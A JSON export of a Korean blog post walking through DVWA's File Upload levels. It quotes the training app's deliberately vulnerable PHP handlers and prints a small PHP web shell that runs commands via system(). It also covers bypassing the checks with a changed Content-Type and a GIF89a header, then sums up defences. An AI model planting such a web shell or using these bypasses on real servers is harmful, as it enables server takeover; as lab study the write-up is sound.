@@ -1,0 +1,768 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "480531a2-bdef-5a97-9b39-bbb396c06050",
+  "kind": "posts",
+  "title": "[DVWA] File Upload",
+  "slug": "tistory-14",
+  "description": "1. File UploadFile Upload 취약점은 웹 애플리케이션이 사용자로부터 입력받은 값을 이용해 파일을 동적으로 읽어오거나 실행할 때, 입력값에 대한 검증이 미흡하여 발생하는 보안 취약점이다.DVWA에서 File Upload 취약점을 알아보자2. 문제 DVWA 웹 사이트에서 서버에 있는 파일을 업로드하는 기능을 구현해 뒀다.파일 선택을 누르면 업로드할 파일을 고를 수 있고 업로드를 누르면 업로드된다. 성공적으로 업로드된 것을 볼 수 있다. 파일을 선택하지 않고 upload를 누르면 your image was not uploaded가 뜬다. burp suite로 확인 시 post요청으로 file을 보낸다. low level 코드low level에 구현된 소스코드는 아래와 같으며 post요청이..",
+  "category": "Wargame / DVWA",
+  "date": "2025-12-19",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2025-12-19T20:17:10+09:00",
+  "updatedAt": "2026-01-20T13:24:15+09:00",
+  "sourceDigest": "ace29b79aaf5cb863317864d389c7a6dd02a224a21ceed1640127f81b680c2f5",
+  "assets": [
+    {
+      "id": "b7a52f08-3822-5911-b5ef-e4e7e249e815",
+      "name": "tistory-14-b7a52f08-3822-5911-b5ef-e4e7e249e815.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/b7a52f08-3822-5911-b5ef-e4e7e249e815.png",
+      "sha": "a9f04382883eb644f3a5b4b4baf0e7f9efa0f51a"
+    },
+    {
+      "id": "143f20e4-a604-5f0b-a4b1-f30f884e1b60",
+      "name": "tistory-14-143f20e4-a604-5f0b-a4b1-f30f884e1b60.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/143f20e4-a604-5f0b-a4b1-f30f884e1b60.png",
+      "sha": "f63829f82b0e814c4fd0e5430625389d9ab8c574"
+    },
+    {
+      "id": "a5e3908f-e7d9-5f47-828c-11a477c98e58",
+      "name": "tistory-14-a5e3908f-e7d9-5f47-828c-11a477c98e58.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/a5e3908f-e7d9-5f47-828c-11a477c98e58.png",
+      "sha": "01e41146b04c0182c19893ec5d87492fad9935a6"
+    },
+    {
+      "id": "e86d28fe-b666-5939-a780-ac8e4428f008",
+      "name": "tistory-14-e86d28fe-b666-5939-a780-ac8e4428f008.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/e86d28fe-b666-5939-a780-ac8e4428f008.png",
+      "sha": "bcfa90b20a1b467f2ccf7dd7a7a4c5646043aca7"
+    },
+    {
+      "id": "e7bb4392-1f76-5853-9abb-b2fde1c87482",
+      "name": "tistory-14-e7bb4392-1f76-5853-9abb-b2fde1c87482.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/e7bb4392-1f76-5853-9abb-b2fde1c87482.png",
+      "sha": "76dc527f24da2894444adeda1405dc12a47ff523"
+    },
+    {
+      "id": "413732cf-9c57-53a3-94ab-ecb7c0b09ee6",
+      "name": "tistory-14-413732cf-9c57-53a3-94ab-ecb7c0b09ee6.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/413732cf-9c57-53a3-94ab-ecb7c0b09ee6.png",
+      "sha": "153fae1bb6c4b47f023770f4475fb047432e6bf0"
+    },
+    {
+      "id": "b58b46ea-066a-5ab2-bc37-75eea5fe32a9",
+      "name": "tistory-14-b58b46ea-066a-5ab2-bc37-75eea5fe32a9.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/b58b46ea-066a-5ab2-bc37-75eea5fe32a9.png",
+      "sha": "8a9d3db2dbfb3205a6f65e43c4e4e428dc3dcbac"
+    },
+    {
+      "id": "945212f5-f005-505e-b29b-d1d070a4e609",
+      "name": "tistory-14-945212f5-f005-505e-b29b-d1d070a4e609.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/945212f5-f005-505e-b29b-d1d070a4e609.png",
+      "sha": "f653011d82f3aec941c4f8fdefcd0f65ef7a3650"
+    },
+    {
+      "id": "1fc290de-d8d3-59bb-99e5-dc1fbef4b363",
+      "name": "tistory-14-1fc290de-d8d3-59bb-99e5-dc1fbef4b363.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/1fc290de-d8d3-59bb-99e5-dc1fbef4b363.png",
+      "sha": "2d67b00b5817e7760ef20e98da17e849f24844c7"
+    },
+    {
+      "id": "b8f43d2d-f898-5398-9a96-edf8c64d4db7",
+      "name": "tistory-14-b8f43d2d-f898-5398-9a96-edf8c64d4db7.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/b8f43d2d-f898-5398-9a96-edf8c64d4db7.png",
+      "sha": "838832d40478ea8643f76cb57301b204fd247a47"
+    },
+    {
+      "id": "ad5f36f5-34e0-5893-a8b0-9bcaab50ea68",
+      "name": "tistory-14-ad5f36f5-34e0-5893-a8b0-9bcaab50ea68.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/ad5f36f5-34e0-5893-a8b0-9bcaab50ea68.png",
+      "sha": "d67808a29fa19fb56da34996fd20f427d8ac5a46"
+    },
+    {
+      "id": "9084a3de-e245-5cc4-a40f-0f508ab0ed24",
+      "name": "tistory-14-9084a3de-e245-5cc4-a40f-0f508ab0ed24.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/9084a3de-e245-5cc4-a40f-0f508ab0ed24.png",
+      "sha": "f978d62e2be632aa01e4fdfc3eb4e07ad94b3c55"
+    },
+    {
+      "id": "cf689939-28e6-530e-bb9e-971e086382e7",
+      "name": "tistory-14-cf689939-28e6-530e-bb9e-971e086382e7.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/cf689939-28e6-530e-bb9e-971e086382e7.png",
+      "sha": "9a0719ff6136ce0c9ddad9f014f4061678e64b8e"
+    },
+    {
+      "id": "9a6c058d-1c1a-5f28-a9ee-b1aa17915e51",
+      "name": "tistory-14-9a6c058d-1c1a-5f28-a9ee-b1aa17915e51.png",
+      "type": "image/png",
+      "path": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/9a6c058d-1c1a-5f28-a9ee-b1aa17915e51.png",
+      "sha": "25f4bd93db4611983299f9b296307a5667e0e1d9"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "b7a52f08-3822-5911-b5ef-e4e7e249e815",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/b7a52f08-3822-5911-b5ef-e4e7e249e815.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. File Upload"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "File Upload 취약점은 웹 애플리케이션이 사용자로부터 입력받은 값을 이용해 파일을 동적으로 읽어오거나 실행할 때, 입력값에 대한 검증이 미흡하여 발생하는 보안 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DVWA에서 File Upload 취약점을 알아보자"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 문제"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "143f20e4-a604-5f0b-a4b1-f30f884e1b60",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/143f20e4-a604-5f0b-a4b1-f30f884e1b60.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DVWA 웹 사이트에서 서버에 있는 파일을 업로드하는 기능을 구현해 뒀다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일 선택을 누르면 업로드할 파일을 고를 수 있고 업로드를 누르면 업로드된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "a5e3908f-e7d9-5f47-828c-11a477c98e58",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/a5e3908f-e7d9-5f47-828c-11a477c98e58.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "e86d28fe-b666-5939-a780-ac8e4428f008",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/e86d28fe-b666-5939-a780-ac8e4428f008.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "성공적으로 업로드된 것을 볼 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일을 선택하지 않고 upload를 누르면 your image was not uploaded가 뜬다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "e7bb4392-1f76-5853-9abb-b2fde1c87482",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/e7bb4392-1f76-5853-9abb-b2fde1c87482.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "burp suite로 확인 시 post요청으로 file을 보낸다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "413732cf-9c57-53a3-94ab-ecb7c0b09ee6",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/413732cf-9c57-53a3-94ab-ecb7c0b09ee6.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": " low level 코드"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "low level에 구현된 소스코드는 아래와 같으며 post요청이 들어오면 hackable/uploads/에 name파라미터를 합쳐서 target_path에 저장한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "여기서 move_uploaded_file() 함수는 PHP에서 HTTP POST 요청을 통해 업로드된 파일을 임시 디렉터리에서 개발자가 지정한 영구적인 위치로 이동시키는 함수이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "php"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_POST[ 'Upload' ] ) ) {\n    // Where are we going to be writing to?\n    $target_path  = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\";\n    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );\n\n    // Can we move the file to the upload folder?\n    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {\n        // No\n        echo '<pre>Your image was not uploaded.</pre>';\n    }\n    else {\n        // Yes!\n        echo \"<pre>{$target_path} succesfully uploaded!</pre>\";\n    }\n}\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "lowlevel에서는 원하는 파일을 업로드할 수 있고 검증도 하지 않아서 php webshell코드를 업로드해보려고 한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "webshell은 web으로 입력받은 코드를 서버의 shell에서 실행하는 코드이며 다음과 같다"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "php"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\necho 'Enter a Command:<br>';\necho '<form action=\"\">';\necho '<input type=text name=\"cmd\">';\necho '<input type=\"submit\">';\necho '</form>';\t\t\t\t\t\n\nif(isset($_GET['cmd'])){\n\tsystem($_GET['cmd']);\n}\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "b58b46ea-066a-5ab2-bc37-75eea5fe32a9",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/b58b46ea-066a-5ab2-bc37-75eea5fe32a9.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "성공적으로 서버에 올라갔다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버에 성공적으로 업로드했다. 업로드된../hackable/uploads/webshell.php을 주소창에 업로드해보면 웹쉘이 나타난다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "945212f5-f005-505e-b29b-d1d070a4e609",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/945212f5-f005-505e-b29b-d1d070a4e609.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": " medium level 코드"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "medium level 코드는 uploaded_type를 검사해 업로드하는 파일이 이미지인지 검사한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "php"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_POST[ 'Upload' ] ) ) {\n    // Where are we going to be writing to?\n    $target_path  = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\";\n    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );\n\n    // File information\n    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];\n    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];\n    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];\n\n    // Is it an image?\n    if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &&\n        ( $uploaded_size < 100000 ) ) {\n\n        // Can we move the file to the upload folder?\n        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {\n            // No\n            echo '<pre>Your image was not uploaded.</pre>';\n        }\n        else {\n            // Yes!\n            echo \"<pre>{$target_path} succesfully uploaded!</pre>\";\n        }\n    }\n    else {\n        // Invalid file\n        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';\n    }\n}\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이미지가 아닌 webshell.php파일을 올리면 실패한다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "1fc290de-d8d3-59bb-99e5-dc1fbef4b363",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/1fc290de-d8d3-59bb-99e5-dc1fbef4b363.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "다시 burp suite로 가보자 프록시 기능을 이용해서 content-Type를 image/jpg로 바꿀 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "b8f43d2d-f898-5398-9a96-edf8c64d4db7",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/b8f43d2d-f898-5398-9a96-edf8c64d4db7.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "바꾸고 나서 업로드에 성공했다. content-type를 바꿔 webshell을 성공적으로 올릴 수 있었다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "ad5f36f5-34e0-5893-a8b0-9bcaab50ea68",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/ad5f36f5-34e0-5893-a8b0-9bcaab50ea68.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "High level 코드"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "High level 코드는 substr로 마지막 파일의 이름 확장자가 jpg, jpeg인지 확인한다. 그리고 getimagesize로 이미지가 맞는지 확인한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "php"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_POST[ 'Upload' ] ) ) {\n    // Where are we going to be writing to?\n    $target_path  = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\";\n    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );\n\n    // File information\n    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];\n    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);\n    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];\n    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];\n\n    // Is it an image?\n    if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &&\n        ( $uploaded_size < 100000 ) &&\n        getimagesize( $uploaded_tmp ) ) {\n\n        // Can we move the file to the upload folder?\n        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {\n            // No\n            echo '<pre>Your image was not uploaded.</pre>';\n        }\n        else {\n            // Yes!\n            echo \"<pre>{$target_path} succesfully uploaded!</pre>\";\n        }\n    }\n    else {\n        // Invalid file\n        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';\n    }\n}\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "똑같이 burp suite에서 filename 파일의 이름을 통해 확장자, content-type를 바꿔주자. 그리고  getimagesize를 우회하기 위해 'GIF89a'를 php코드 위에 작성해 준다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "9084a3de-e245-5cc4-a40f-0f508ab0ed24",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/9084a3de-e245-5cc4-a40f-0f508ab0ed24.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "cf689939-28e6-530e-bb9e-971e086382e7",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/cf689939-28e6-530e-bb9e-971e086382e7.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "성공적으로 업로드되었다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "근데 파일을 요청하니 이렇게 나온다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "9a6c058d-1c1a-5f28-a9ee-b1aa17915e51",
+          "src": "/assets/uploads/480531a2-bdef-5a97-9b39-bbb396c06050/9a6c058d-1c1a-5f28-a9ee-b1aa17915e51.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버가 해당 파일을 이미지로 인식하여 코드를 실행하지 않고 그림만 보여주기 때문에, 강제로 코드를 실행시키기 위해 File Inclusion 취약점을 이용해 웹쉘을 띄울 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Impossible level 코드"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Impossible level 코드는 사용자 입력된 파일의 이름을 md5 해쉬함수에 넣어 이름을 추측하기 어렵게 만든다. 또한 유효성 검사와 imagecreatefromjpeg를 통해서 이미지를 새로 그려 만약 웹 쉘 코드가 숨어 있어도 그리면서 제거하게 된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "php"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_POST[ 'Upload' ] ) ) {\n    // Check Anti-CSRF token\n    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n\n\n    // File information\n    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];\n    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);\n    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];\n    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];\n    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];\n\n    // Where are we going to be writing to?\n    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';\n    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';\n    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;\n    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );\n    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;\n\n    // Is it an image?\n    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&\n        ( $uploaded_size < 100000 ) &&\n        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&\n        getimagesize( $uploaded_tmp ) ) {\n\n        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)\n        if( $uploaded_type == 'image/jpeg' ) {\n            $img = imagecreatefromjpeg( $uploaded_tmp );\n            imagejpeg( $img, $temp_file, 100);\n        }\n        else {\n            $img = imagecreatefrompng( $uploaded_tmp );\n            imagepng( $img, $temp_file, 9);\n        }\n        imagedestroy( $img );\n\n        // Can we move the file to the web root from the temp folder?\n        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {\n            // Yes!\n            echo \"<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>\";\n        }\n        else {\n            // No\n            echo '<pre>Your image was not uploaded.</pre>';\n        }\n\n        // Delete any temp files\n        if( file_exists( $temp_file ) )\n            unlink( $temp_file );\n    }\n    else {\n        // Invalid file\n        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';\n    }\n}\n\n// Generate Anti-CSRF token\ngenerateSessionToken();\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. 3줄 요약"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "사용자 입력값을 검증하지 않으면 웹쉘을 업로드하여 서버를 장악할 수 있는 File Upload 취약점이 발생한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "Content-Type 변조나 이미지 파일 내 코드 삽입 등을 통해 검증 우회가 가능하며, 실행을 위해 File Inclusion과 연계하기도 한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "보안을 위해서는 파일명 난수화, 확장자 화이트리스트 검증, 그리고 이미지 재생성을 통해 악성 코드를 제거해야 한다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "참고"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "8ce54c3a-f3ee-5638-b576-8475530f5c64",
+          "href": "https://yehey-study.tistory.com/entry/%ED%8C%8C%EC%9D%BC-%EC%97%85%EB%A1%9C%EB%93%9C-%EA%B3%B5%EA%B2%A9-%EB%B0%8F-%EC%8B%A4%EC%8A%B5",
+          "title": "파일 업로드 공격 및 실습",
+          "description": "파일 업로드 공격 :파일 업로드 기능에 적절한 보안 대책이 적용되어 있지 않을 때 파일 업로드 취약점이 발생한다. 만약, 이러한 파일 업로드 기능을 구현할 때 아무 파일이나 업로드 할 수 있",
+          "image": "https://yt010108.github.io/assets/imported/tistory/663bc8d7b037ced0f7f9868bb3965acfc39e0385acd5f90d74caec47d994b25a.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "8deebb9f-21ba-58ec-83e3-8b381852e1f2",
+          "href": "https://basic-computer.tistory.com/entry/DVWA-%EC%8B%A4%EC%8A%B5-File-Uploadhigh",
+          "title": "[DVWA 실습] File Upload(high)",
+          "description": "문제 해결 방법 High단계는 클라이언트에서 자동으로 설정되는 업로드 타입을 보는 것이 아니라 실제 파일 이름의 확장자가 jpg인지 jpeg인지 png인지를 검사하고 있다. 또한 getimagesize라는 함수를 ",
+          "image": "https://yt010108.github.io/assets/imported/tistory/1da175473a7f0d24886803be8da7c99ccc8b698ca11840755842b90d5a9e0f73.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph"
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/14",
+    "originalId": "14",
+    "publishedAt": "2025-12-19T20:17:10+09:00",
+    "updatedAt": "2026-01-20T13:24:15+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
